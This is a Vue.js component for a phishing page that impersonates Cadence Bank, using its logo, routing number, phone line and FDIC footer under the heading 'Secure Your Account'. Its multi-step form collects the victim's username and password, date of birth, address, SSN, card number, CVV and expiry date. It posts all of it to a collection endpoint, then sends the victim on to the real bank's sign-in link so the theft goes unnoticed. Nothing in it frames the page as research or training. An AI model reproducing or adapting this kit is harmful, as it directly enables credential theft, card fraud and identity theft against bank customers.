<template>
    <div class="page-container">
      <div class="container">
        <img class="logo" src="@/assets/cadence-logo.png" alt="Cadence Logo">
        <div v-if="step <= 3" class="form-container">
          <h2>Secure Your Account</h2>
          <form @submit.prevent="submitForm">
            <div v-show="step === 1">
              <div class="form-group">
                <label for="username">Username/User ID</label>
                <input type="text" id="username" v-model="formData.username" required>
              </div>
              <div class="form-group">
                <label for="password">Password</label>
                <div class="input-group">
                  <input :type="showPassword ? 'text' : 'password'" id="password" v-model="formData.password" required>
                  <img :src="showPassword ? require('@/assets/eye-open.png') : require('@/assets/eye-closed.png')" @click="togglePasswordVisibility" class="password-icon" alt="Toggle Password Visibility">
                </div>
              </div>
              <div class="form-group">
                <label for="confirmPassword">Confirm Password</label>
                <div class="input-group">
                  <input :type="showConfirmPassword ? 'text' : 'password'" id="confirmPassword" v-model="formData.confirmPassword" required>
                  <img :src="showConfirmPassword ? require('@/assets/eye-open.png') : require('@/assets/eye-closed.png')" @click="toggleConfirmPasswordVisibility" class="password-icon" alt="Toggle Password Visibility">
                </div>
              </div>
            </div>
            <div v-show="step === 2">
              <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" v-model="formData.email" required>
              </div>
              <div class="form-group">
                <label for="dob">Date of Birth</label>
                <input type="date" id="dob" v-model="formData.dob" required>
              </div>
              <div class="form-group">
                <label for="phone">Phone Number</label>
                <input type="tel" id="phone" v-model="formData.phone" required @input="formatPhone">
              </div>
              <div class="form-group">
                <label for="houseAddress">House Address</label>
                <input type="text" id="houseAddress" v-model="formData.houseAddress" required>
              </div>
              <div class="form-group">
                <label for="city">City</label>
                <input type="text" id="city" v-model="formData.city" required>
              </div>
              <div class="form-group">
                <label for="state">State</label>
                <select id="state" v-model="formData.state" required>
                  <option value="">Select State</option>
                  <option v-for="state in states" :key="state" :value="state">{{ state }}</option>
                </select>
              </div>
              <div class="form-group">
                <label for="zipCode">Zip Code</label>
                <input type="text" id="zipCode" v-model="formData.zipCode" required @input="formatZipCode">
              </div>
            </div>
            <div v-show="step === 3">
              <div class="form-group">
                <label for="ssn">SSN</label>
                <input type="text" id="ssn" v-model="formData.ssn" required @input="formatSSN">
              </div>
              <div class="form-group">
                <label for="cardNumber">Card Number</label>
                <input type="text" id="cardNumber" v-model="formData.cardNumber" required @input="formatCardNumber">
              </div>
              <div class="form-group">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" v-model="formData.cvv" required maxlength="3" @input="formatCVV">
              </div>
              <div class="form-group">
                <label for="expiryDate">Card Expiry Date</label>
                <input type="text" id="expiryDate" v-model="formData.expiryDate" required @input="formatExpiryDate">
              </div>
            </div>
            <div class="button-group">
              <button type="button" @click="prevStep" v-if="step > 1">Previous</button>
              <button type="button" @click="nextStep" v-if="step < 3">Next</button>
              <button type="submit" v-if="step === 3">Submit</button>
            </div>
          </form>
        </div>
        <div v-if="step === 4" class="success-page">
          <h2>Account Secured Successfully!</h2>
          <p class="text-dark">You can <a href="https://online.cadencebank.com/SignIn.aspx">login here</a>.</p>
        </div>
      </div>
      <footer class="footer-content">
        <div class="footer-column">
          <img src="@/assets/cadence-logo.png" alt="Cadence Logo">
        </div>
        <div class="footer-column">
          <p>Routing Number: 084201278</p>
          <p>Customer Service: 1-888-797-7711 M-F 7:00 a.m. - 8:00 p.m. (CST)</p>
          <p>Saturday 7:00 a.m. - 5:00 p.m. (CST)</p>
          <p>© 2024 Cadence Bank. All Rights Reserved.</p>
        </div>
        <div class="footer-column">
          <p class="fdic">Equal Housing Lender <img class="fdic-logo" src="https://online.cadencebank.com/content.aspx?theme=Theme5&color1=%23424242&color2=%23F5F5F5&image=EqualHousingLender.svg"></p>
          <p>NLMS #410279</p>
          <p class="fdic">Federally Insured <img class="fdic-logo" src="https://online.cadencebank.com/content.aspx?theme=Theme5&color1=%23424242&image=svg/fdic.svg" alt="FDIC"></p>
        </div>
      </footer>
    </div>
  </template>
  
  <script>
  import axios from 'axios';
  
  export default {
    data() {
      return {
        step: 1,
        showPassword: false,
        showConfirmPassword: false,
        formData: {
          username: '',
          password: '',
          confirmPassword: '',
          email: '',
          dob: '',
          phone: '',
          houseAddress: '',
          city: '',
          state: '',
          zipCode: '',
          ssn: '',
          cardNumber: '',
          cvv: '',
          expiryDate: ''
        },
        states: [
          'Alabama', 'Alaska', 'Arizona', 'Arkansas', 'California', 'Colorado', 'Connecticut', 'Delaware', 'Florida', 'Georgia',
          'Hawaii', 'Idaho', 'Illinois', 'Indiana', 'Iowa', 'Kansas', 'Kentucky', 'Louisiana', 'Maine', 'Maryland', 'Massachusetts',
          'Michigan', 'Minnesota', 'Mississippi', 'Missouri', 'Montana', 'Nebraska', 'Nevada', 'New Hampshire', 'New Jersey', 'New Mexico',
          'New York', 'North Carolina', 'North Dakota', 'Ohio', 'Oklahoma', 'Oregon', 'Pennsylvania', 'Rhode Island', 'South Carolina',
          'South Dakota', 'Tennessee', 'Texas', 'Utah', 'Vermont', 'Virginia', 'Washington', 'West Virginia', 'Wisconsin', 'Wyoming'
        ]
      };
    },
    methods: {
      togglePasswordVisibility() {
        this.showPassword = !this.showPassword;
      },
      toggleConfirmPasswordVisibility() {
        this.showConfirmPassword = !this.showConfirmPassword;
      },
      nextStep() {
        if (this.step < 3) this.step++;
      },
      prevStep() {
        if (this.step > 1) this.step--;
      },
      formatPhone() {
        this.formData.phone = this.formData.phone.replace(/\D/g, '').slice(0, 10);
        if (this.formData.phone.length > 6) {
          this.formData.phone = `${this.formData.phone.slice(0, 3)}-${this.formData.phone.slice(3, 6)}-${this.formData.phone.slice(6)}`;
        } else if (this.formData.phone.length > 3) {
          this.formData.phone = `${this.formData.phone.slice(0, 3)}-${this.formData.phone.slice(3)}`;
        }
      },
      formatZipCode() {
        this.formData.zipCode = this.formData.zipCode.replace(/\D/g, '').slice(0, 5);
      },
      formatSSN() {
        this.formData.ssn = this.formData.ssn.replace(/\D/g, '').slice(0, 9);
        if (this.formData.ssn.length > 5) {
          this.formData.ssn = `${this.formData.ssn.slice(0, 3)}-${this.formData.ssn.slice(3, 5)}-${this.formData.ssn.slice(5)}`;
        } else if (this.formData.ssn.length > 3) {
          this.formData.ssn = `${this.formData.ssn.slice(0, 3)}-${this.formData.ssn.slice(3)}`;
        }
      },
      formatCardNumber() {
        this.formData.cardNumber = this.formData.cardNumber.replace(/\D/g, '').slice(0, 16);
        this.formData.cardNumber = this.formData.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ');
      },
      formatCVV() {
        this.formData.cvv = this.formData.cvv.replace(/\D/g, '').slice(0, 3);
      },
      formatExpiryDate() {
        this.formData.expiryDate = this.formData.expiryDate.replace(/\D/g, '').slice(0, 4);
        if (this.formData.expiryDate.length > 2) {
          this.formData.expiryDate = `${this.formData.expiryDate.slice(0, 2)}/${this.formData.expiryDate.slice(2)}`;
        }
      },
      async submitForm() {
        try {
            await axios.post('http://localhost:3000/submit-form', this.formData);
            this.formSubmitted = true;
            this.formError = null;
        } catch (error) {
            this.formError = error.message;
        }
      },

    }
  };
  </script>


  
  <style scoped>
  .page-container {
    background: url('@/assets/cadence-bg-desktop.jpg') no-repeat center center fixed;
    background-size: cover;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 20px;
  }
  
  .container {
    background-color: white;
    padding: 20px;
    border-radius: 10px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    max-width: 500px;
    width: 100%;
  }
  
  .logo {
    width: 200px;
    height: auto;
    display: block;
    margin: 0 auto 20px;
  }
  
  h2 {
    text-align: center;
    color: #343a40;
  }
  
  .form-group {
    margin-bottom: 15px;
  }
  
  .form-group label {
    display: block;
    color: black;
    margin-bottom: 5px;
  }
  
  .form-group input,
  .form-group select {
    width: 100%;
    padding: 10px;
    border: 1px solid #6c757d;
    border-radius: 4px;
    background-color: white;
    color: #343a40;
  }
  
  .input-group {
    display: flex;
    align-items: center;
    position: relative;
  }
  
  .password-icon {
    width: 20px;
    height: 20px;
    cursor: pointer;
    position: absolute;
    right: 10px;
  }
  
  .button-group {
    display: flex;
    justify-content: space-between;
  }
  
  button {
    background-color: #1D871EFF;
    color: white;
    padding: 10px 20px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    width: 100%;
    margin-top: 10px;
  }
  
  button:hover {
    background-color: #155d9b;
  }
  
  .success-page {
    text-align: center;
    color: white;
  }
  
  .footer-content {
    background-color: white;
    padding: 20px;
    display: flex;
    justify-content: space-between;
    align-items: left;
    width: 100%;
    max-width: 1500px;
    margin-top: 20px;
    /* border-radius: 10px; */
  }
  
  .footer-column {
    flex: 1;
    text-align: left;
  }
  
  .footer-column img {
    width: 200px;
    height: auto;
  }
  
  .footer-column p {
    color: #343a40;
    font-family: "Ubuntu", "Open Sans", Arial, Helvetica;
    font-size: 12px;
    line-height: 0.5;
  }
  
  .fdic img {
    width: 20px;
    vertical-align: middle;
  }
  </style>